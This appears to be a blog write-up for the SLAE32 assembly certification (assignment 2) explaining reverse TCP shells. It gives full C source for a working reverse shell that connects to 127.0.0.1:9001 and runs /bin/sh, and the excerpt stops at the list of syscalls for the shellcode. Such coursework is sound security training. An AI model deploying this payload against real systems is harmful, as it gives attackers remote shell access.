---
title: SLAE32 - Assignment#2 [Reverse TCP Shell]
author: bigb0ss
date: 2020-12-13 13:26:00 +0800
categories: [SLAE32, Assignment_2_Reverse-TCP-Shell]
tags: [slae32, assembly, x86, Reverse TCP Shell]
image: /assets/img/post/slae32/slae32.png
---

<b>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:</b>

<b>http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</b>

<b>Student ID: SLAE-1542</b>

[SLAE32 Assignemt#2 Github](https://github.com/bigb0sss/SLAE32)


# Assignement #2 
* Create a Shell_Reverse_TCP shellcode
	- Reverse connects to configured IP and Port
	- Execs shell on successful connection
* IP and Port should be easily configurable

# What is a Reverse Shell?
Oppose to a Bind Shell, a Reverse Shell connects back to the attacker's computer upon a payload executed on the victim's system. This type of shell is more useful when the target organization has a strong Firewalls for inbound connection. The Reverse Shell can take the advantage of common outbound ports such as port 80, 443, 53 and etc. 

![image](/assets/img/post/slae32/assignment2/01.png)

# Socket Programming
Similar to the Bind TCP Shell exercise, let's create a Reverseh TCP Shell in a higher programming language. We will use `C` again:

```c++
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <unistd.h>

int main()
{
    int sockfd, acceptfd;
	int port = 9001;

	// Address struct
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port); 
    addr.sin_addr.s_addr = inet_addr("127.0.0.1");

   	// 1) Socket Syscall (sys_socket 1)
	sockfd = socket(AF_INET, SOCK_STREAM, 0);

    // 2) Connect Syscall
    connect(sockfd, (struct sockaddr *) &addr, sizeof(addr));
    
    // 3) Dup2 Syscall
    dup2(sockfd, 0);    //stdin
    dup2(sockfd, 1);    //stdout
    dup2(sockfd, 2);    //stderr

    // 4) Execve Syscall
    execve("/bin/sh", NULL, NULL);
    return 0;
}
```

Let's compile this: 

```console
gcc reverse-tcp-shell.c -o reverse-tcp-shell -w
```

The compiled reverse shell binary can successfully connect back to `127.0.0.1:9001` as expected.

![image](/assets/img/post/slae32/assignment2/02.png)


# Shellcode

For the Reverse TCP Shell, we need to following `syscalls`:

1) Socket
2) Connect 
3) Dup2
4) Execve